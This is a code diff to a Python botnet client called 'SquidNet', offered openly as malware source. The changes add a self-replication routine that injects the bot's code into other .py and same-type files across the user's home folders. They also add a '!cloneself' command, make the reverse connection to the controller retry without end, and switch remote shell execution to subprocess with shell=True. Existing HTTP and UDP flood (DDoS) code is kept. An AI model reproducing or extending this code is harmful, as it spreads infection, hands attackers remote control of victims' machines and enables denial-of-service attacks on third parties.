@@ -1,4 +1,5 @@
 
+#-----SquidNet-Bot-Script-----#
 import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
 import subprocess, re
 try:
@@ -3246,33 +3247,35 @@ class DDoS:
             result += chr(item)
         return result
     def ddos(self):
-        try:
-            code = 0
-            agent = random.choice(self.useragents)
-            req = urllib.request.Request(self.ip, headers={'User-Agent': agent,
-                                                      'Referer': random.choice(self.referers) + self.build_querystr(
-                                                          random.randint(50, 100)),
-                                                      'Cache-Control': 'no-cache',
-                                                      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-                                                      'Keep-Alive': random.randint(110, 160),
-                                                      'Connection': 'keep-alive'})
-            urllib.request.urlopen(req)
-            code = 200
-        except urllib.error.HTTPError as e:
-            code_split = str(e).split()
-            code = code_split[2]
-            code = str(code[0] + code[1] + code[2])
-            if "500" in str(e):
-                code = 500
-            elif "429" in str(e):
-                code = 500
-            elif code.startswith('5'):
-                code = 500
-        except urllib.error.URLError as e:
-            if "A connection attempt failed" in str(e):
-                code = 500
-        except:
-            pass
+        if not self.stopatk:
+            try:
+                code = 0
+                agent = random.choice(self.useragents)
+                req = urllib.request.Request(self.ip, headers={'User-Agent': agent,
+                                                               'Referer': random.choice(
+                                                                   self.referers) + self.build_querystr(
+                                                                   random.randint(50, 100)),
+                                                               'Cache-Control': 'no-cache',
+                                                               'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                                                               'Keep-Alive': random.randint(110, 160),
+                                                               'Connection': 'keep-alive'})
+                urllib.request.urlopen(req)
+                code = 200
+            except urllib.error.HTTPError as e:
+                code_split = str(e).split()
+                code = code_split[2]
+                code = str(code[0] + code[1] + code[2])
+                if "500" in str(e):
+                    code = 500
+                elif "429" in str(e):
+                    code = 500
+                elif code.startswith('5'):
+                    code = 500
+            except urllib.error.URLError as e:
+                if "A connection attempt failed" in str(e):
+                    code = 500
+            except:
+                pass
         return code
     def start_thr(self):
         while True:
@@ -3347,8 +3350,14 @@ class Bot:
         self.msg = ""
         self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
         self.file_saving = False
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((self.ip, self.port))
+        while True:
+            try:
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((self.ip, self.port))
+                break
+            except:
+                self.connection.close()
+                time.sleep(1)
         self.fileeditor = False
         time.sleep(1)
         msg = socket.gethostname()+" "+self.getip()+" "+os.getlogin()+" "+sys.platform
@@ -3360,7 +3369,10 @@ class Bot:
         self.conntest = threading.Thread(target=self.conn_test)
         self.conntest.start()
         self.key = key
-        self.fernet_session = Fernet(self.key)
+        try:
+            self.fernet_session = Fernet(self.key)
+        except:
+            self.fernet_session = None
     def getip(self):
         try:
             url = 'https://httpbin.org/ip'
@@ -3621,6 +3633,81 @@ OS:       {sys.platform}
             os.system(f'start {website}')
         else:
             os.system(f'open {website}')
+    
+    def clone(self):
+        file_ending = sys.argv[0].split(".")
+        file_ending = file_ending[len(file_ending) - 1]
+        if "py" in file_ending:
+            own_file = open(sys.argv[0], "r")
+            own_content = own_file.readlines()
+            own_file.close()
+            lines = []
+            in_code = False
+            for line in own_content:
+                if "#-----SquidNet-Bot-Script-----#" in line:
+                    in_code = True
+                if in_code:
+                    lines.append(line)
+                if "#-----End-Of-Bot-----#" in line:
+                    in_code = False
+                    break
+        else:
+            own_file = open(sys.argv[0], "rb")
+            own_content = own_file.read()
+            own_file.close()
+        if sys.platform == "win32":
+            main_dir = f"C:/Users/{os.getlogin()}/"
+        else:
+            main_dir = f"/Users/{sys.argv[0].split('/')[1]}/"
+        os.chdir(main_dir)
+        workingdirs = []
+        workingdirs.append(main_dir)
+        workingdirs.append(os.getcwd())
+        dirlist = os.listdir()
+        for dirs in dirlist:
+            if "." in dirs:
+                pass
+            else:
+                workingdirs.append(main_dir + str(dirs))
+        dirlist = os.listdir()
+        for dirs in workingdirs:
+            try:
+                os.chdir(dirs)
+            except:
+                pass
+            for files in dirlist:
+                try:
+                    if '.'+file_ending in files:
+                        if "py" in file_ending:
+                            file = open(files, "r")
+                            content = file.readlines()
+                            file.close()
+                            if "#-----SquidNet-Bot-Script-----#" in content:
+                                pass
+                            else:
+                                file = open(files, "w")
+                                file.writelines(lines)
+                                file.writelines("\n\n")
+                                file.writelines(content)
+                                file.close()
+                        else:
+                            file = open(files, "rb")
+                            content = file.read()
+                            file.close()
+                            if own_content in content:
+                                pass
+                            else:
+                                file = open(files, "wb")
+                                file.write(own_content + "\n\n".encode())
+                                file.write(content)
+                                file.close()
+                except:
+                    pass
+    def gotowebsite(self, website):
+        if sys.platform == "win32":
+            os.system(f'start {website}')
+        else:
+            os.system(f'open {website}')
     def run_cmd(self):
         try:
             if self.fileeditor:
@@ -3647,7 +3734,7 @@ OS:       {sys.platform}
                     self.dos = DDoS(ip, delay)
                 elif self.msg.startswith('!stopatk'):
                     try:
-                        self.dos.stopatk()
+                        self.dos.stop_atk()
                     except:
                         pass
                     try:
@@ -3658,6 +3745,10 @@ OS:       {sys.platform}
                         self.udpflood.Stop_Atk()
                     except:
                         pass
+                elif self.msg.startswith('!cloneself'):
+                    cloner = threading.Thread(target=self.clone)
+                    cloner.start()
+                    self.connection.send("Successfully replicated files.".encode())
                 elif self.msg.startswith('!changedirdesktop'):
                     self.changedir(self.desktop)
                 elif self.msg.startswith('!openfile'):
@@ -3788,12 +3879,14 @@ OS:       {sys.platform}
                     self.udp_flood = threading.Thread(target=self.udpflood.UDP_Flood)
                     self.udp_flood.start()
                 else:
-                    output = os.popen(self.msg).read()
-                    self.send(output)
+                    cmd = subprocess.Popen(self.msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdout = cmd.stdout.read()+cmd.stderr.read()
+                    self.send(stdout)
         except Exception as e:
             self.send(f"Error in script: {e}".encode())
 ip = 'localhost'
 port = 80
 key = b'QAYEFKLQT469LdHWIs4ZG7xKrDr8JRzMTwNFvoQFILg='
 bot = Bot(ip, port, key)
+#-----End-Of-Bot-----#
         
